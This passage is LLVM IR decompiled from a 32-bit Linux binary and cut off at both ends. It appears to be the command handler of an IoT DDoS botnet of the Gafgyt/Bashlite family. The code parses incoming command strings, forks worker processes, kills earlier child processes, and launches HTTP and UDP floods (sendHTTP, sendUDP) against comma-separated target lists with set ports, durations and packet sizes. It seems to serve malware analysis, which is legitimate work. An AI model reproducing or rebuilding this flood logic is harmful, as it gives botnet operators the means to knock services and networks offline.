  %v2_804c259 = load i32, i32* %arg2, align 4
  %v4_804c276 = inttoptr i32 %v2_804c259 to i8*
  %v7_804c288 = call i32 @_strncmp(i8* %v4_804c276, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056a5f.113, i32 0, i32 0), i32 6)
  %v8_804c288 = urem i32 %v7_804c288, 2
  %v9_804c288 = icmp eq i32 %v8_804c288, 0
  %v0_804c28a = load i1, i1* %cf.global-to-local, align 1
  %v2_804c28a = or i1 %v0_804c28a, %v9_804c288
  %v3_804c28a = zext i1 %v2_804c28a to i32
  %v4_804c28a = load i32, i32* %edx.global-to-local, align 4
  %v5_804c28a = and i32 %v4_804c28a, -256
  %v6_804c28a = or i32 %v3_804c28a, %v5_804c28a
  %v7_804c28a = xor i32 %v6_804c28a, 1
  store i32 %v7_804c28a, i32* %edx.global-to-local, align 4
  %v1_804c292 = trunc i32 %v7_804c28a to i8
  %v3_804c292 = zext i1 %v0_804c28a to i8
  %v15_804c292 = icmp eq i8 %v1_804c292, %v3_804c292
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c29b = icmp eq i1 %v15_804c292, false
  br i1 %v1_804c29b, label %dec_label_pc_804c3d4, label %dec_label_pc_804c2a1

dec_label_pc_804c2a1:                             ; preds = %dec_label_pc_804c256
  %v1_804c2a4 = add i32 %tmp119, 4
  %v5_804c2a4 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804c2a4, i1* %cf.global-to-local, align 1
  %v1_804c2a7 = inttoptr i32 %v1_804c2a4 to i32*
  %v2_804c2a7 = load i32, i32* %v1_804c2a7, align 4
  store i1 false, i1* @df, align 1
  %v4_804c2c4 = inttoptr i32 %v2_804c2a7 to i8*
  store i32 %v2_804c2a7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a65.114 to i32), i32* @edi, align 4
  %v7_804c2d6 = call i32 @_strncmp(i8* %v4_804c2c4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a65.114, i32 0, i32 0), i32 4)
  %v8_804c2d6 = urem i32 %v7_804c2d6, 2
  %v9_804c2d6 = icmp eq i32 %v8_804c2d6, 0
  %v0_804c2d8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c2d8 = or i1 %v0_804c2d8, %v9_804c2d6
  %v3_804c2d8 = zext i1 %v2_804c2d8 to i32
  %v4_804c2d8 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c2d8 = and i32 %v4_804c2d8, -256
  %v6_804c2d8 = or i32 %v3_804c2d8, %v5_804c2d8
  %v7_804c2d8 = xor i32 %v6_804c2d8, 1
  store i32 %v7_804c2d8, i32* @edx, align 4
  %v1_804c2e0 = trunc i32 %v7_804c2d8 to i8
  %v3_804c2e0 = zext i1 %v0_804c2d8 to i8
  %v15_804c2e0 = icmp eq i8 %v1_804c2e0, %v3_804c2e0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c2e9 = icmp eq i1 %v15_804c2e0, false
  br i1 %v1_804c2e9, label %dec_label_pc_804c32c, label %dec_label_pc_804c2eb

dec_label_pc_804c2eb:                             ; preds = %dec_label_pc_804c2a1
  %v0_804c2eb = load i32, i32* @global_var_8060970.115, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c2f0 = icmp eq i32 %v0_804c2eb, 0
  br i1 %v1_804c2f0, label %dec_label_pc_804cd5c, label %dec_label_pc_804c2f8

dec_label_pc_804c2f8:                             ; preds = %dec_label_pc_804c2eb
  %v2_804c308 = call i32 @kill(i32 %v0_804c2eb, i32 9)
  %v0_804c30d = load i32, i32* @global_var_805a6e0.18, align 32
  %v2_804c31d = call i32 @Rootsprintf(i32 %v0_804c30d, i32 ptrtoint ([14 x i8]* @global_var_8056a69.116 to i32))
  store i32 0, i32* @global_var_8060970.115, align 16
  br label %dec_label_pc_804c32c

dec_label_pc_804c32c:                             ; preds = %dec_label_pc_804c2a1, %dec_label_pc_804c2f8
  store i1 %v5_804c2a4, i1* %cf.global-to-local, align 1
  %v2_804c332 = load i32, i32* %v1_804c2a7, align 4
  store i1 false, i1* @df, align 1
  %v4_804c34f = inttoptr i32 %v2_804c332 to i8*
  %v7_804c361 = call i32 @_strncmp(i8* %v4_804c34f, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a77.117, i32 0, i32 0), i32 3)
  %v8_804c361 = urem i32 %v7_804c361, 2
  %v9_804c361 = icmp eq i32 %v8_804c361, 0
  %v0_804c363 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c363 = or i1 %v0_804c363, %v9_804c361
  %v3_804c363 = zext i1 %v2_804c363 to i32
  %v4_804c363 = load i32, i32* @edx, align 4
  %v5_804c363 = and i32 %v4_804c363, -256
  %v6_804c363 = or i32 %v3_804c363, %v5_804c363
  %v7_804c363 = xor i32 %v6_804c363, 1
  store i32 %v7_804c363, i32* %edx.global-to-local, align 4
  %v1_804c36b = trunc i32 %v7_804c363 to i8
  %v3_804c36b = zext i1 %v0_804c363 to i8
  %v15_804c36b = icmp eq i8 %v1_804c36b, %v3_804c36b
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c374 = icmp eq i1 %v15_804c36b, false
  br i1 %v1_804c374, label %dec_label_pc_804c3d4, label %dec_label_pc_804c376

dec_label_pc_804c376:                             ; preds = %dec_label_pc_804c32c
  %v0_804c376 = load i32, i32* @global_var_8060970.115, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c37b = icmp eq i32 %v0_804c376, 0
  %v1_804c37d = icmp eq i1 %v1_804c37b, false
  br i1 %v1_804c37d, label %dec_label_pc_804cd5c, label %dec_label_pc_804c383

dec_label_pc_804c383:                             ; preds = %dec_label_pc_804c376
  %v1_804c383 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c399 = icmp eq i32 %v1_804c383, 0
  br i1 %v4_804c399, label %dec_label_pc_804c3b6, label %dec_label_pc_804c39f

dec_label_pc_804c39f:                             ; preds = %dec_label_pc_804c383
  store i32 %v1_804c383, i32* @global_var_8060970.115, align 16
  br label %dec_label_pc_804cd5c

dec_label_pc_804c3b6:                             ; preds = %dec_label_pc_804c383
  store i1 true, i1* %cf.global-to-local, align 1
  %v2_804c3c3 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_804c3cf = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c3d4:                             ; preds = %dec_label_pc_804c32c, %dec_label_pc_804c256
  %v2_804c3d7 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c3f4 = inttoptr i32 %v2_804c3d7 to i8*
  store i32 %v2_804c3d7, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8056a7a.118 to i32), i32* @edi, align 4
  %v7_804c406 = call i32 @_strncmp(i8* %v4_804c3f4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056a7a.118, i32 0, i32 0), i32 5)
  %v8_804c406 = urem i32 %v7_804c406, 2
  %v9_804c406 = icmp eq i32 %v8_804c406, 0
  %v0_804c408 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c408 = or i1 %v0_804c408, %v9_804c406
  %v3_804c408 = zext i1 %v2_804c408 to i32
  %v4_804c408 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c408 = and i32 %v4_804c408, -256
  %v6_804c408 = or i32 %v3_804c408, %v5_804c408
  %v7_804c408 = xor i32 %v6_804c408, 1
  store i32 %v7_804c408, i32* @edx, align 4
  %v1_804c410 = trunc i32 %v7_804c408 to i8
  %v3_804c410 = zext i1 %v0_804c408 to i8
  %v4_804c410 = sub nsw i8 %v1_804c410, %v3_804c410
  %v15_804c410 = icmp eq i8 %v4_804c410, 0
  store i1 false, i1* @cf, align 1
  %v1_804c419 = icmp eq i1 %v15_804c410, false
  br i1 %v1_804c419, label %dec_label_pc_804c53e, label %dec_label_pc_804c41f

dec_label_pc_804c41f:                             ; preds = %dec_label_pc_804c3d4
  %v2_804c414 = sext i8 %v4_804c410 to i32
  %v9_804c41f = icmp ult i32 %arg1, 5
  store i1 %v9_804c41f, i1* %cf.global-to-local, align 1
  %v7_804c423 = icmp sgt i32 %arg1, 5
  br i1 %v7_804c423, label %dec_label_pc_804c429, label %dec_label_pc_804cd5c

dec_label_pc_804c429:                             ; preds = %dec_label_pc_804c41f
  %v1_804c42c = add i32 %tmp119, 12
  %v5_804c42c = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c42c, i1* %cf.global-to-local, align 1
  %v1_804c42f = inttoptr i32 %v1_804c42c to i32*
  %v2_804c42f = load i32, i32* %v1_804c42f, align 4
  %v1_804c434 = call i32 @atol(i32 %v2_804c42f)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp126 = icmp slt i32 %v1_804c434, 1
  br i1 %tmp126, label %dec_label_pc_804cd5c, label %dec_label_pc_804c441

dec_label_pc_804c441:                             ; preds = %dec_label_pc_804c429
  %v1_804c444 = add i32 %tmp119, 20
  %v5_804c444 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804c444, i1* %cf.global-to-local, align 1
  %v1_804c447 = inttoptr i32 %v1_804c444 to i32*
  %v2_804c447 = load i32, i32* %v1_804c447, align 4
  %v1_804c44c = call i32 @atol(i32 %v2_804c447)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp127 = icmp slt i32 %v1_804c44c, 1
  %tmp128 = icmp eq i1 %tmp127, false
  br i1 %tmp128, label %dec_label_pc_804c45a, label %dec_label_pc_804cd5c

dec_label_pc_804c45a:                             ; preds = %dec_label_pc_804c441
  %v0_804c45a = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c45f = icmp eq i32 %v0_804c45a, 0
  %v1_804c461 = icmp eq i1 %v1_804c45f, false
  br i1 %v1_804c461, label %dec_label_pc_804cd5c, label %dec_label_pc_804c467

dec_label_pc_804c467:                             ; preds = %dec_label_pc_804c45a
  store i1 %v5_804c444, i1* %cf.global-to-local, align 1
  %v2_804c46d = load i32, i32* %v1_804c447, align 4
  %v1_804c472 = call i32 @atol(i32 %v2_804c46d)
  store i32 %v1_804c472, i32* @esi, align 4
  store i1 %v5_804c42c, i1* %cf.global-to-local, align 1
  %v2_804c47f = load i32, i32* %v1_804c42f, align 4
  %v1_804c484 = call i32 @atol(i32 %v2_804c47f)
  store i32 %v1_804c484, i32* %edx.global-to-local, align 4
  %v1_804c48e = add i32 %tmp119, 8
  %v1_804c491 = inttoptr i32 %v1_804c48e to i32*
  %v1_804c496 = add i32 %tmp119, 4
  %v5_804c496 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804c496, i1* %cf.global-to-local, align 1
  %v1_804c499 = inttoptr i32 %v1_804c496 to i32*
  %v0_804c49b = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804c49b, i32* @ebx, align 4
  %v2_804c4bc = call i32 @Rootsprintf(i32 %v0_804c49b, i32 ptrtoint ([38 x i8]* @global_var_8056a80.119 to i32))
  %v1_804c4c4 = add i32 %tmp119, 24
  %v5_804c4c4 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c4c4, i1* %cf.global-to-local, align 1
  %v1_804c4c7 = inttoptr i32 %v1_804c4c4 to i32*
  %v2_804c4c7 = load i32, i32* %v1_804c4c7, align 4
  %v1_804c4cc = call i32 @atol(i32 %v2_804c4c7)
  store i32 %v1_804c4cc, i32* @ebx, align 4
  store i1 %v5_804c444, i1* %cf.global-to-local, align 1
  %v2_804c4d9 = load i32, i32* %v1_804c447, align 4
  %v1_804c4de = call i32 @atol(i32 %v2_804c4d9)
  store i32 %v1_804c4de, i32* @esi, align 4
  %v1_804c4e8 = add i32 %tmp119, 16
  %v1_804c4eb = inttoptr i32 %v1_804c4e8 to i32*
  %v2_804c4eb = load i32, i32* %v1_804c4eb, align 4
  store i32 %v2_804c4eb, i32* @edi, align 4
  store i1 %v5_804c42c, i1* %cf.global-to-local, align 1
  %v2_804c4f5 = load i32, i32* %v1_804c42f, align 4
  %v1_804c4fa = call i32 @atol(i32 %v2_804c4f5)
  %v1_804c4ff = urem i32 %v1_804c4fa, 65536
  store i32 %v1_804c4ff, i32* %edx.global-to-local, align 4
  %v2_804c50a = load i32, i32* %v1_804c491, align 4
  store i1 %v5_804c496, i1* %cf.global-to-local, align 1
  %v2_804c514 = load i32, i32* %v1_804c499, align 4
  %v0_804c516 = load i32, i32* @ebx, align 4
  %v0_804c51a = load i32, i32* @esi, align 4
  %v0_804c51e = load i32, i32* @edi, align 4
  %v6_804c52d = trunc i32 %v1_804c4fa to i16
  %v7_804c52d = call i32 @sendHTTP(i32 %v2_804c514, i32 %v2_804c50a, i16 %v6_804c52d, i32 %v0_804c51e, i32 %v0_804c51a, i32 %v0_804c516)
  store i32 %v7_804c52d, i32* @eax, align 4
  %v1_804c539 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804c53e

dec_label_pc_804c53e:                             ; preds = %dec_label_pc_804c3d4, %dec_label_pc_804c467
  %v2_804c541 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c55e = inttoptr i32 %v2_804c541 to i8*
  store i32 %v2_804c541, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056aa6.120 to i32), i32* @edi, align 4
  %v7_804c570 = call i32 @_strncmp(i8* %v4_804c55e, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056aa6.120, i32 0, i32 0), i32 4)
  %v8_804c570 = urem i32 %v7_804c570, 2
  %v9_804c570 = icmp eq i32 %v8_804c570, 0
  %v0_804c572 = load i1, i1* @cf, align 1
  %v2_804c572 = or i1 %v0_804c572, %v9_804c570
  %v3_804c572 = zext i1 %v2_804c572 to i32
  %v4_804c572 = load i32, i32* @edx, align 4
  %v5_804c572 = and i32 %v4_804c572, -256
  %v6_804c572 = or i32 %v3_804c572, %v5_804c572
  %v7_804c572 = xor i32 %v6_804c572, 1
  store i32 %v7_804c572, i32* %edx.global-to-local, align 4
  %v1_804c57a = trunc i32 %v7_804c572 to i8
  %v3_804c57a = zext i1 %v0_804c572 to i8
  %v15_804c57a = icmp eq i8 %v1_804c57a, %v3_804c57a
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c583 = icmp eq i1 %v15_804c57a, false
  br i1 %v1_804c583, label %dec_label_pc_804c84b, label %dec_label_pc_804c589

dec_label_pc_804c589:                             ; preds = %dec_label_pc_804c53e
  %v9_804c589 = icmp ult i32 %arg1, 5
  store i1 %v9_804c589, i1* %cf.global-to-local, align 1
  %v7_804c58d = icmp sgt i32 %arg1, 5
  br i1 %v7_804c58d, label %dec_label_pc_804c593, label %dec_label_pc_804c64c

dec_label_pc_804c593:                             ; preds = %dec_label_pc_804c589
  %v1_804c596 = add i32 %tmp119, 12
  %v5_804c596 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c596, i1* %cf.global-to-local, align 1
  %v1_804c599 = inttoptr i32 %v1_804c596 to i32*
  %v2_804c599 = load i32, i32* %v1_804c599, align 4
  %v1_804c59e = call i32 @atol(i32 %v2_804c599)
  %v5_804c5a3 = icmp ne i32 %v1_804c59e, -1
  store i1 %v5_804c5a3, i1* %cf.global-to-local, align 1
  %v10_804c5a3 = icmp eq i32 %v1_804c59e, -1
  br i1 %v10_804c5a3, label %dec_label_pc_804c64c, label %dec_label_pc_804c5ac

dec_label_pc_804c5ac:                             ; preds = %dec_label_pc_804c593
  %v1_804c5af = add i32 %tmp119, 8
  %v5_804c5af = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804c5af, i1* %cf.global-to-local, align 1
  %v1_804c5b2 = inttoptr i32 %v1_804c5af to i32*
  %v2_804c5b2 = load i32, i32* %v1_804c5b2, align 4
  %v1_804c5b7 = call i32 @atol(i32 %v2_804c5b2)
  %v5_804c5bc = icmp ne i32 %v1_804c5b7, -1
  store i1 %v5_804c5bc, i1* %cf.global-to-local, align 1
  %v10_804c5bc = icmp eq i32 %v1_804c5b7, -1
  br i1 %v10_804c5bc, label %dec_label_pc_804c64c, label %dec_label_pc_804c5c5

dec_label_pc_804c5c5:                             ; preds = %dec_label_pc_804c5ac
  %v1_804c5c8 = add i32 %tmp119, 16
  %v2_804c5c8 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804c5c8, i1* %cf.global-to-local, align 1
  %v1_804c5cb = inttoptr i32 %v1_804c5c8 to i32*
  %v2_804c5cb = load i32, i32* %v1_804c5cb, align 4
  %v1_804c5d0 = call i32 @atol(i32 %v2_804c5cb)
  %v5_804c5d5 = icmp ne i32 %v1_804c5d0, -1
  store i1 %v5_804c5d5, i1* %cf.global-to-local, align 1
  %v10_804c5d5 = icmp eq i32 %v1_804c5d0, -1
  br i1 %v10_804c5d5, label %dec_label_pc_804c64c, label %dec_label_pc_804c5da

dec_label_pc_804c5da:                             ; preds = %dec_label_pc_804c5c5
  %v1_804c5dd = add i32 %tmp119, 20
  %v5_804c5dd = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804c5dd, i1* %cf.global-to-local, align 1
  %v1_804c5e0 = inttoptr i32 %v1_804c5dd to i32*
  %v2_804c5e0 = load i32, i32* %v1_804c5e0, align 4
  %v1_804c5e5 = call i32 @atol(i32 %v2_804c5e0)
  %v5_804c5ea = icmp ne i32 %v1_804c5e5, -1
  store i1 %v5_804c5ea, i1* %cf.global-to-local, align 1
  %v10_804c5ea = icmp eq i32 %v1_804c5e5, -1
  br i1 %v10_804c5ea, label %dec_label_pc_804c64c, label %dec_label_pc_804c5ef

dec_label_pc_804c5ef:                             ; preds = %dec_label_pc_804c5da
  store i1 %v5_804c5dd, i1* %cf.global-to-local, align 1
  %v2_804c5f5 = load i32, i32* %v1_804c5e0, align 4
  %v1_804c5fa = call i32 @atol(i32 %v2_804c5f5)
  %v1_804c5ff = add i32 %v1_804c5fa, -65536
  %v2_804c5ff = icmp ult i32 %v1_804c5fa, 65536
  %v3_804c5ff = sub i32 65535, %v1_804c5fa
  %v4_804c5ff = and i32 %v3_804c5ff, %v1_804c5fa
  %v5_804c5ff = icmp slt i32 %v4_804c5ff, 0
  store i1 %v2_804c5ff, i1* %cf.global-to-local, align 1
  %v6_804c5ff = icmp eq i32 %v1_804c5ff, 0
  %v7_804c5ff = icmp slt i32 %v1_804c5ff, 0
  %v3_804c604 = icmp eq i1 %v7_804c5ff, %v5_804c5ff
  %v4_804c604 = icmp eq i1 %v6_804c5ff, false
  %v5_804c604 = and i1 %v4_804c604, %v3_804c604
  br i1 %v5_804c604, label %dec_label_pc_804c64c, label %dec_label_pc_804c606

dec_label_pc_804c606:                             ; preds = %dec_label_pc_804c5ef
  store i1 %v5_804c5dd, i1* %cf.global-to-local, align 1
  %v2_804c60c = load i32, i32* %v1_804c5e0, align 4
  %v1_804c611 = call i32 @atol(i32 %v2_804c60c)
  %v1_804c616 = add i32 %v1_804c611, -65500
  %v5_804c616 = icmp ult i32 %v1_804c611, 65500
  %v6_804c616 = sub i32 65499, %v1_804c611
  %v7_804c616 = and i32 %v6_804c616, %v1_804c611
  %v8_804c616 = icmp slt i32 %v7_804c616, 0
  store i1 %v5_804c616, i1* %cf.global-to-local, align 1
  %v9_804c616 = icmp eq i32 %v1_804c616, 0
  %v10_804c616 = icmp slt i32 %v1_804c616, 0
  %v3_804c61b = icmp eq i1 %v10_804c616, %v8_804c616
  %v4_804c61b = icmp eq i1 %v9_804c616, false
  %v5_804c61b = and i1 %v4_804c61b, %v3_804c61b
  br i1 %v5_804c61b, label %dec_label_pc_804c64c, label %dec_label_pc_804c61d

dec_label_pc_804c61d:                             ; preds = %dec_label_pc_804c606
  store i1 %v2_804c5c8, i1* %cf.global-to-local, align 1
  %v2_804c623 = load i32, i32* %v1_804c5cb, align 4
  %v1_804c628 = call i32 @atol(i32 %v2_804c623)
  %v1_804c62d = add i32 %v1_804c628, -32
  %v2_804c62d = icmp ult i32 %v1_804c628, 32
  %v3_804c62d = sub i32 31, %v1_804c628
  %v4_804c62d = and i32 %v3_804c62d, %v1_804c628
  %v5_804c62d = icmp slt i32 %v4_804c62d, 0
  store i1 %v2_804c62d, i1* %cf.global-to-local, align 1
  %v6_804c62d = icmp eq i32 %v1_804c62d, 0
  %v7_804c62d = icmp slt i32 %v1_804c62d, 0
  %v3_804c630 = icmp eq i1 %v7_804c62d, %v5_804c62d
  %v4_804c630 = icmp eq i1 %v6_804c62d, false
  %v5_804c630 = and i1 %v4_804c630, %v3_804c630
  br i1 %v5_804c630, label %dec_label_pc_804c64c, label %dec_label_pc_804c632

dec_label_pc_804c632:                             ; preds = %dec_label_pc_804c61d
  %v8_804c632 = icmp ult i32 %arg1, 7
  store i1 %v8_804c632, i1* %cf.global-to-local, align 1
  %v12_804c632 = icmp eq i32 %arg1, 7
  %v1_804c636 = icmp eq i1 %v12_804c632, false
  br i1 %v1_804c636, label %dec_label_pc_804c666, label %dec_label_pc_804c638

dec_label_pc_804c638:                             ; preds = %dec_label_pc_804c632
  %v1_804c63b = add i32 %tmp119, 24
  %v5_804c63b = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c63b, i1* %cf.global-to-local, align 1
  %v1_804c63e = inttoptr i32 %v1_804c63b to i32*
  %v2_804c63e = load i32, i32* %v1_804c63e, align 4
  %v1_804c643 = call i32 @atol(i32 %v2_804c63e)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp129 = icmp slt i32 %v1_804c643, 1
  %tmp130 = icmp eq i1 %tmp129, false
  br i1 %tmp130, label %dec_label_pc_804c666, label %dec_label_pc_804c64c

dec_label_pc_804c64c:                             ; preds = %dec_label_pc_804c589, %dec_label_pc_804c638, %dec_label_pc_804c61d, %dec_label_pc_804c606, %dec_label_pc_804c5ef, %dec_label_pc_804c5da, %dec_label_pc_804c5c5, %dec_label_pc_804c5ac, %dec_label_pc_804c593
  %v0_804c64c = load i32, i32* @global_var_805a6e0.18, align 32
  %v2_804c65c = call i32 @Rootsprintf(i32 %v0_804c64c, i32 ptrtoint ([113 x i8]* @global_var_8056aac.121 to i32))
  br label %dec_label_pc_804cd5c

dec_label_pc_804c666:                             ; preds = %dec_label_pc_804c638, %dec_label_pc_804c632
  %v1_804c669 = add i32 %tmp119, 4
  %v1_804c66c = inttoptr i32 %v1_804c669 to i32*
  %v2_804c66c = load i32, i32* %v1_804c66c, align 4
  store i1 %v5_804c5af, i1* %cf.global-to-local, align 1
  %v2_804c677 = load i32, i32* %v1_804c5b2, align 4
  %v1_804c67c = call i32 @atol(i32 %v2_804c677)
  store i1 %v5_804c596, i1* %cf.global-to-local, align 1
  %v2_804c68a = load i32, i32* %v1_804c599, align 4
  %v1_804c68f = call i32 @atol(i32 %v2_804c68a)
  store i1 %v2_804c5c8, i1* %cf.global-to-local, align 1
  %v2_804c69d = load i32, i32* %v1_804c5cb, align 4
  %v1_804c6a2 = call i32 @atol(i32 %v2_804c69d)
  store i1 %v5_804c5dd, i1* %cf.global-to-local, align 1
  %v2_804c6b0 = load i32, i32* %v1_804c5e0, align 4
  %v1_804c6b5 = call i32 @atol(i32 %v2_804c6b0)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c6c1 = icmp sgt i32 %arg1, 6
  br i1 %v7_804c6c1, label %dec_label_pc_804c6e5, label %dec_label_pc_804c6e5.thread

dec_label_pc_804c6e5.thread:                      ; preds = %dec_label_pc_804c666
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804c632, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c716

dec_label_pc_804c6e5:                             ; preds = %dec_label_pc_804c666
  %v1_804c6c6 = add i32 %tmp119, 24
  %v5_804c6c6 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c6c6, i1* %cf.global-to-local, align 1
  %v1_804c6c9 = inttoptr i32 %v1_804c6c6 to i32*
  %v2_804c6c9 = load i32, i32* %v1_804c6c9, align 4
  %v1_804c6ce = call i32 @atol(i32 %v2_804c6c9)
  store i32 %v1_804c6ce, i32* @esi, align 4
  store i1 %v8_804c632, i1* %cf.global-to-local, align 1
  %v7_804c6f2 = icmp eq i32 %arg1, 7
  br i1 %v7_804c6f2, label %dec_label_pc_804c716, label %dec_label_pc_804c6f4

dec_label_pc_804c6f4:                             ; preds = %dec_label_pc_804c6e5
  %v1_804c6f7 = add i32 %tmp119, 28
  %v5_804c6f7 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c6f7, i1* %cf.global-to-local, align 1
  %v1_804c6fa = inttoptr i32 %v1_804c6f7 to i32*
  %v2_804c6fa = load i32, i32* %v1_804c6fa, align 4
  %v1_804c6ff = call i32 @atol(i32 %v2_804c6fa)
  br label %dec_label_pc_804c716

dec_label_pc_804c716:                             ; preds = %dec_label_pc_804c6e5, %dec_label_pc_804c6e5.thread, %dec_label_pc_804c6f4
  %storemerge8137 = phi i32 [ %v1_804c6ce, %dec_label_pc_804c6f4 ], [ %v1_804c6ce, %dec_label_pc_804c6e5 ], [ 1000, %dec_label_pc_804c6e5.thread ]
  %storemerge7 = phi i32 [ %v1_804c6ff, %dec_label_pc_804c6f4 ], [ 1000000, %dec_label_pc_804c6e5 ], [ 1000000, %dec_label_pc_804c6e5.thread ]
  store i32 %storemerge7, i32* @edi, align 4
  %v9_804c71f = icmp ult i32 %arg1, 8
  store i1 %v9_804c71f, i1* %cf.global-to-local, align 1
  %v7_804c723 = icmp sgt i32 %arg1, 8
  br i1 %v7_804c723, label %dec_label_pc_804c725, label %dec_label_pc_804c747

dec_label_pc_804c725:                             ; preds = %dec_label_pc_804c716
  %v1_804c728 = add i32 %tmp119, 32
  %v2_804c728 = icmp ugt i32* %arg2, inttoptr (i32 -33 to i32*)
  store i1 %v2_804c728, i1* %cf.global-to-local, align 1
  %v1_804c72b = inttoptr i32 %v1_804c728 to i32*
  %v2_804c72b = load i32, i32* %v1_804c72b, align 4
  %v1_804c730 = call i32 @atol(i32 %v2_804c72b)
  %phitmp = sext i32 %v1_804c730 to i64
  br label %dec_label_pc_804c747

dec_label_pc_804c747:                             ; preds = %dec_label_pc_804c716, %dec_label_pc_804c725
  %storemerge6 = phi i64 [ %phitmp, %dec_label_pc_804c725 ], [ 0, %dec_label_pc_804c716 ]
  %v2_804c75e = inttoptr i32 %v2_804c66c to i8*
  %v3_804c75e = call i32 @__GI_strchr(i8* %v2_804c75e, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c763 = icmp eq i32 %v3_804c75e, 0
  br i1 %v1_804c763, label %dec_label_pc_804c7f6, label %dec_label_pc_804c76b

dec_label_pc_804c76b:                             ; preds = %dec_label_pc_804c747
  store i32 %v2_804c66c, i32* @eax, align 4
  %v2_804c779 = call i32 @__GI_strtok(i32 %v2_804c66c, i32 ptrtoint (i32* @global_var_8056a31.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c7eb34 = icmp eq i32 %v2_804c779, 0
  %v1_804c7ef41 = icmp eq i1 %v4_804c7eb34, false
  br i1 %v1_804c7ef41, label %dec_label_pc_804c783, label %dec_label_pc_804cd5c

dec_label_pc_804c783:                             ; preds = %dec_label_pc_804c76b, %dec_label_pc_804c7d4
  %storemerge942 = phi i32 [ %v2_804c7e3, %dec_label_pc_804c7d4 ], [ %v2_804c779, %dec_label_pc_804c76b ]
  %v0_804c783 = call i32 @listFork()
  store i32 %v0_804c783, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c788 = icmp eq i32 %v0_804c783, 0
  %v1_804c78a = icmp eq i1 %v1_804c788, false
  br i1 %v1_804c78a, label %dec_label_pc_804c7d4, label %dec_label_pc_804c78c

dec_label_pc_804c78c:                             ; preds = %dec_label_pc_804c783
  %v9_804c7c3 = call i32 @sendUDP(i32 %storemerge942, i32 %v1_804c67c, i32 %v1_804c68f, i32 %v1_804c6a2, i32 %v1_804c6b5, i32 %storemerge8137, i32 %storemerge7, i64 %storemerge6)
  %v1_804c7cf = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c7d4:                             ; preds = %dec_label_pc_804c783
  %v2_804c7e3 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8056a31.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c7eb = icmp eq i32 %v2_804c7e3, 0
  %v1_804c7ef = icmp eq i1 %v4_804c7eb, false
  br i1 %v1_804c7ef, label %dec_label_pc_804c783, label %dec_label_pc_804cd5c

dec_label_pc_804c7f6:                             ; preds = %dec_label_pc_804c747
  %v0_804c7f6 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c7fb = icmp eq i32 %v0_804c7f6, 0
  %v1_804c7fd = icmp eq i1 %v1_804c7fb, false
  br i1 %v1_804c7fd, label %dec_label_pc_804cd5c, label %dec_label_pc_804c803

dec_label_pc_804c803:                             ; preds = %dec_label_pc_804c7f6
  %v9_804c83a = call i32 @sendUDP(i32 %v2_804c66c, i32 %v1_804c67c, i32 %v1_804c68f, i32 %v1_804c6a2, i32 %v1_804c6b5, i32 %storemerge8137, i32 %storemerge7, i64 %storemerge6)
  %v1_804c846 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c84b:                             ; preds = %dec_label_pc_804c53e
  %v2_804c84e = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c86b = inttoptr i32 %v2_804c84e to i8*
